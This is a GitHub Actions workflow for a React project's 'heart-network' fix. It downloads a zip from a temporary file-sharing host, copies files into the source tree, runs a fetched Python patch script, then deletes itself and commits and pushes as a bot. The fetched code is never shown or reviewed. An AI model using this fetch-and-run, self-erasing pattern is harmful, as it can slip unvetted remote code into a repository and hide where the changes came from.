name: heart-network
on:
  push:
    paths: [".github/workflows/heart-network.yml"]
permissions:
  contents: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch
        run: |
          curl -sSL -X POST https://temp.sh/dGUEy/fix7.zip -o fix7.zip
          echo "b83161af81493eadbd0085c2ffbfdf83  fix7.zip" | md5sum -c
          mkdir -p _fix7
          unzip -o fix7.zip -d _fix7
          cp _fix7/Home.tsx src/pages/Home.tsx
          cp _fix7/patch_network.py patch_network.py
      - name: patch
        run: python3 patch_network.py
      - name: syntax-check
        run: |
          for f in src/pages/Home.tsx src/pages/NetworkApp.tsx; do
            echo "checking $f"
            npx --yes esbuild@0.23.1 --jsx=automatic --bundle --external:* --log-level=warning --outfile=/dev/null "$f"
          done
      - name: commit
        run: |
          rm -rf fix7.zip _fix7 patch_network.py .github/workflows/heart-network.yml
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git add -A
          git commit -m "Save heart was blocked by the card caption; developer panel no longer hangs and says who it is for"
          git push
